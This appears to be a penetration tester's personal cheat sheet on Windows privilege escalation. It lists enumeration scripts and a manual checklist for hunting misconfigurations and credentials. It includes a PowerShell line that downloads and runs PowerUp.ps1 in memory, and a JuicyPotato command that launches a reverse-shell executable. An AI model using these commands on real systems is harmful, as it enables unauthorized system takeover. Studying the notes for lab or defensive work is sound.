# Script
- winPEAS https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- windows-privesc-check2.exe (https://github.com/pentestmonkey/windows-privesc-check)
- PowerUp.ps1 (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

-> add "Invoke-AllChecks" at the end if you want to perform this function.

Example of use: powershell.exe iex (New-Object Net.Webclient).DownloadString('http://127.0.0.1/PowerUp.ps1')

# Tricks
- To query service "sc" may not work on the target => try "sc.exe"
- Try JuicyPotato (source?)
JuicyPotato.exe -l 4445 -p revshell_443_exe.exe -t *
(I don't know what the -l option is, but whatever I put in it it works)
- Upnphost is vulnerable in Windows XP SP1 (see https://www.fuzzysecurity.com/tutorials/16.html)
- Always transfer in binary mode in ftp:
  ftp > binary
  ftp > put ...

# Manual enumeration
- Manual_privesc_commands_list.sh (this is NOT a bash script)

___Hostname___: may reveal the function of the machine

___Hostname___: may reveal the function of the machine

___OS version/architecture___: kernel exploits

___Processes___: processes running as privileged user may be of interest if they contain vulnerabilities

___Network/Firewall___: could reveal other networks to pivot to
could reveal port bindings on local machine that were not accessible by scanning
firewall rules can facilitate port forwarding/tunneling if we know which inbound/outbound ports are filtered

___Scheduled tasks___: we want to check here for insecure file permissions

___Installed applications/patch level___: we want to find vulnerable applications that could lead to privesc

___Readable/Writable files & directories___: looking to modify scripts or binaries executed under context of privileged account
also sensitive files containing hard-coded credentials

___Unmounted Disks___: not all drives are mounted at boot => we should look for unmounted drives
we might want to mount unmounted partitions to search for interesting documents/credentials/...

___Device drivers/Kernel modules___: get drivers/drivers versions/kernel version to look for exploits

___Binaries That AutoElevate___: if we can run a binary that is autoelevating we could craft one or use it to elevate
